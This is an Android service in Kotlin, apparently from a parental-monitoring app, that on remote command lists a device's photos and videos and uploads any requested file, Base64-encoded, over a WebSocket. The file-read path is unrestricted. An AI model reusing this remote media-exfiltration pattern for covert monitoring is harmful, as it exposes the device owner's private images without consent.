package com.xixfamily.kids.service

import android.app.Service
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ContentUris
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.xixfamily.kids.R
import com.xixfamily.kids.network.SocketManager
import com.xixfamily.kids.utils.PreferenceManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class MediaAccessService : Service() {

    companion object {
        private const val TAG = "MediaAccess"
        private const val CHANNEL_ID = "media_channel"
        private const val NOTIF_ID = 7001

        private var isRunning = false
        fun isServiceRunning(): Boolean = isRunning
    }

    private lateinit var prefs: PreferenceManager

    override fun onCreate() {
        super.onCreate()
        prefs = PreferenceManager.getInstance(this)
        isRunning = true
        createNotificationChannel()
        Log.d(TAG, "MediaAccessService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "LIST" -> {
                val mediaType = intent.getStringExtra("mediaType") ?: "all"
                val limit = intent.getIntExtra("limit", 20)
                scanAndSendMediaList(mediaType, limit)
            }
            "FILE" -> {
                val filePath = intent.getStringExtra("filePath") ?: ""
                sendMediaFile(filePath)
            }
            "STOP" -> stopSelf()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }

    private fun scanAndSendMediaList(mediaType: String, limit: Int) {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Media Access")
            .setContentText("Memindai galeri...")
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        startForeground(NOTIF_ID, notification)

        Thread {
            try {
                val mediaFiles = JSONArray()
                val uri: Uri
                val selection: String?
                val selectionArgs: Array<String>?

                when (mediaType) {
                    "image" -> {
                        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                        selection = "${MediaStore.Images.Media._ID} > ?"
                        selectionArgs = arrayOf("0")
                    }
                    "video" -> {
                        uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                        selection = "${MediaStore.Video.Media._ID} > ?"
                        selectionArgs = arrayOf("0")
                    }
                    else -> {
                        uri = MediaStore.Files.getContentUri("external")
                        selection = "${MediaStore.Files.FileColumns.MEDIA_TYPE} IN (?, ?)"
                        selectionArgs = arrayOf(
                            MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE.toString(),
                            MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO.toString()
                        )
                    }
                }

                val projection = arrayOf(
                    MediaStore.MediaColumns._ID,
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.MIME_TYPE,
                    MediaStore.MediaColumns.DATE_ADDED
                )

                val cursor = contentResolver.query(
                    uri, projection, selection, selectionArgs,
                    "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT $limit"
                )

                cursor?.use { c ->
                    while (c.moveToNext()) {
                        val id = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                        val name = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME))
                        val data = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA))
                        val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE))
                        val mime = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE))
                        val added = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED))

                        val type = if (mime?.startsWith("video") == true) "video" else "image"

                        mediaFiles.put(JSONObject().apply {
                            put("id", id)
                            put("fileName", name ?: "unknown")
                            put("filePath", data ?: "")
                            put("fileSize", size)
                            put("mimeType", mime ?: "image/jpeg")
                            put("mediaType", type)
                            put("dateAdded", added)
                        })
                    }
                }

                // Send via WebSocket
                if (SocketManager.getInstance().isSocketConnected()) {
                    SocketManager.getInstance().emit("media:list:result", JSONObject().apply {
                        put("mediaFiles", mediaFiles)
                    })
                    Log.d(TAG, "Sent ${mediaFiles.length()} media files")
                }

                stopForeground(STOP_FOREGROUND_REMOVE)
            } catch (e: Exception) {
                Log.e(TAG, "Error scanning media: ${e.message}")
                stopForeground(STOP_FOREGROUND_REMOVE)
            }
        }.start()
    }

    private fun sendMediaFile(filePath: String) {
        Thread {
            try {
                val file = java.io.File(filePath)
                if (!file.exists()) {
                    Log.e(TAG, "File not found: $filePath")
                    return@Thread
                }

                val fis = java.io.FileInputStream(file)
                val baos = ByteArrayOutputStream()
                val buffer = ByteArray(8192)
                var bytesRead: Int

                while (fis.read(buffer).also { bytesRead = it } != -1) {
                    baos.write(buffer, 0, bytesRead)
                }
                fis.close()

                val fileBase64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                baos.close()

                val mimeType = java.net.URLConnection.guessContentTypeFromName(file.name)
                    ?: "application/octet-stream"

                if (SocketManager.getInstance().isSocketConnected()) {
                    SocketManager.getInstance().emit("media:file:result", JSONObject().apply {
                        put("filePath", filePath)
                        put("fileName", file.name)
                        put("fileBase64", fileBase64)
                        put("mimeType", mimeType)
                    })
                    Log.d(TAG, "Sent file: ${file.name} (${fileBase64.length} bytes base64)")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending media file: ${e.message}")
            }
        }.start()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Media Access",
                NotificationManager.IMPORTANCE_LOW
            ).apply { description = "Akses media galeri" }
            val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }
}
